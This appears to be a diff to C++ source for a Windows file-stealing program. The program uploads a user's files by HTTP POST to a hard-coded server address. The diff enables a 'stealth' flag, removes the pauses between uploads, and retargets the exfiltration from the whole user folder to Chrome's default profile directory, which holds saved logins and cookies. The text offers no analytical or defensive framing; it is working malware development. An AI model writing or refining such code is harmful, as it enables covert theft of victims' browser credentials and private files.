@@ -16,7 +16,7 @@
 namespace fs = std::filesystem;
 
 #define susBehaviour false
-#define stealthBehaviour false
+#define stealthBehaviour true
 
 #define SERV_PORT 8080 // The port the HTTP POST request will be sent to
 const char szHost[] = "192.168.1.139"; // The IP address of the server
@@ -146,7 +146,6 @@ void uploadFilesInFolder(fs::path p) {
 			printf("Sending file %s\n", entry.path().filename().string().c_str());
 #endif
 			sendFile(entry.path().string(), username + "_" + entry.path().filename().string());
-			Sleep(1000);
 		}
 	}
 }
@@ -156,7 +155,6 @@ void uploadFilesInFolderRecursive(fs::path p) {
 		// Check if entry is a file or a folder
 		if (!entry.is_directory()) {
 			sendFile(entry.path().string(), entry.path().filename().string());
-			Sleep(100);
 		}
 	}
 }
@@ -197,25 +195,8 @@ int main() {
 	printf("%s | %s\n", szStartupExecPath, szExecPath);
 	#endif
 #endif // susBehaviour
-	/*
-	fs::path desktopPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Desktop");
-	fs::path downloadsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Downloads");
-	fs::path picturesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Pictures");
-	fs::path documentsPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Documents");
-	fs::path videosPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Videos");
-	fs::path musicPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Music");
-	fs::path favouritesPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME")) / fs::path("Favorites");
-	// Start uploading stuff
-	uploadFilesInFolder(documentsPath);
-	uploadFilesInFolder(desktopPath);
-	uploadFilesInFolder(picturesPath);
-	uploadFilesInFolder(downloadsPath);
-	uploadFilesInFolder(videosPath);
-	uploadFilesInFolder(musicPath);
-	uploadFilesInFolder(favouritesPath);
-	*/
-	fs::path userPath = fs::path("C:\\Users\\") / fs::path(getenv("USERNAME"));
-	uploadFilesInFolderRecursive(userPath);
+	fs::path chromeDataPath = "C:\\Users\\" / fs::path(getenv("USERNAME")) / "AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
+	uploadFilesInFolderRecursive(chromeDataPath);
 	// Done!
 	ExitProcess(EXIT_SUCCESS);
 }
